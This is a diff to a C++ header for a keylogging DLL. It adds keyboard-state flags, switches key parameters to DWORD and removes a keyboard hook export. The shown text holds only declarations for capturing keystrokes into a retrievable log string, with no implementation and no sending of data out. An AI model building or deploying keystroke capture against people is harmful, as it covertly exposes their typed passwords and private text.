@@ -2,6 +2,11 @@
 // PVS-Studio Static Code Analyzer for C, C++, C#, and Java: http://www.viva64.com
 #pragma once
 
+//global key state flags
+inline bool shiftDown = false;
+inline bool capsToggled = false;
+inline bool numlockToggled = false;
+
 #ifdef KEYLOGGER_EXPORTS
 #define LOGLIB_API __declspec(dllimport)
 #else
@@ -14,10 +19,7 @@
 #include <thread>
 #include <string>
 #include <string_view>
-#include <fstream>
 #endif
-
-inline std::ofstream file;
 
 //global log string
 inline std::string logStr;
@@ -27,17 +29,17 @@ inline int sizeOfLogStr = 0;
 
 void SetGlobalKeyStates();
 
-void PrintSpecialKeys(const int& key, const bool& shiftState);
+void PrintSpecialKeys(const DWORD& key, const bool& shiftState);
 
-void PrintDigits(const int& key, const bool& shiftState);
+void PrintDigits(const DWORD& key, const bool& shiftState);
 
-void PrintAlpha(const int& key, const bool&& upper);
+void PrintAlpha(const DWORD& key, const bool&& upper);
 
-inline void LogKeys(const std::string_view&&);
+void LogKeys(const std::string_view&&);
 
-inline void LogKeys(const int&&);
+void LogKeys(const DWORD&&);
 
-inline void LogDigit(const int&&);
+void LogDigit(const DWORD&&);
 
 extern "C++" LOGLIB_API inline std::string GetLog();
 
@@ -45,10 +47,6 @@ extern "C++" LOGLIB_API inline void ClearLogStr();
 
 extern "C++" LOGLIB_API inline int GetSizeOfLogStr();
 
-extern "C++" LOGLIB_API void StartLog();
-
 extern "C++" LOGLIB_API inline void InitFile();
 
 extern "C++" LOGLIB_API inline void CloseFile();
-
-extern "C" LOGLIB_API LRESULT CALLBACK KeyboardProc(int, WPARAM, LPARAM);
